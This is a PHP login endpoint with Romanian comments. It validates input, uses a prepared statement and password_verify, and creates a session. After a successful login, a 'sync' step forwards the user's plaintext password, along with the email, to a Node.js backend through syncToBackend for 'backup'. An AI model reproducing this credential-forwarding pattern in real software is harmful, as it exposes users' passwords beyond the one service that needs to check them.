<?php
/**
 * Endpoint pentru autentificarea utilizatorilor
 * Primește email și parolă, verifică în baza de date și creează sesiunea
 * Returnează răspuns JSON cu succes sau eroare
 */
require_once 'config.php';

// Setăm header-ul pentru a indica că returnăm JSON
header('Content-Type: application/json');

// Verificăm dacă request-ul este de tip POST - singura metodă acceptată pentru login
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Preluăm și decodăm datele JSON din corpul request-ului
$data = json_decode(file_get_contents('php://input'), true);
$email = isset($data['email']) ? trim($data['email']) : '';
$password = isset($data['password']) ? $data['password'] : '';

// VALIDARE INPUT
// Verificăm dacă email-ul și parola sunt completate
if (empty($email) || empty($password)) {
    http_response_code(400); // Bad Request
    echo json_encode(['error' => 'Email and password are required']);
    exit;
}

// Obținem conexiunea la baza de date
$conn = getDBConnection();

// CAUTARE UTILIZATOR ÎN BAZA DE DATE
// Folosim prepared statements pentru a preveni SQL injection
$stmt = $conn->prepare('SELECT * FROM users WHERE email = ?');
$stmt->bind_param('s', $email); // 's' înseamnă string
$stmt->execute();
$result = $stmt->get_result();

// Verificăm dacă utilizatorul există
if ($result->num_rows === 0) {
    http_response_code(401); // Unauthorized
    echo json_encode(['error' => 'Invalid email or password']);
    $stmt->close();
    $conn->close();
    exit;
}

// Preluăm datele utilizatorului
$user = $result->fetch_assoc();

// VERIFICARE PAROLĂ
// Folosim password_verify() pentru a compara parola trimisă cu hash-ul din baza de date
// Parolele sunt stocate ca hash-uri folosind bcrypt (password_hash())
if (!password_verify($password, $user['password'])) {
    http_response_code(401); // Unauthorized
    echo json_encode(['error' => 'Invalid email or password']);
    $stmt->close();
    $conn->close();
    exit;
}

// CREARE SESIUNE
// Stocăm informațiile utilizatorului în sesiune pentru a-l menține logat
$_SESSION['userId'] = $user['id'];
$_SESSION['email'] = $user['email'];
$_SESSION['name'] = $user['name'] ? $user['name'] : $user['email'];

// SINCRONIZARE CU BACKEND NODE.JS
// Trimitem datele de login către backend pentru backup/sincronizare
// Această operațiune este non-blocantă și nu afectează experiența utilizatorului
syncToBackend('/api/auth/login', [
    'email' => $email,
    'password' => $password
]);

// RĂSPUNS SUCCES
// Returnăm un răspuns JSON cu mesajul de succes și datele utilizatorului
http_response_code(200); // OK
echo json_encode([
    'message' => 'Login successful',
    'user' => [
        'id' => $user['id'],
        'email' => $user['email'],
        'name' => $user['name'] ? $user['name'] : $user['email']
    ]
]);

// Închidem conexiunea la baza de date pentru a elibera resursele
$stmt->close();
$conn->close();
?>
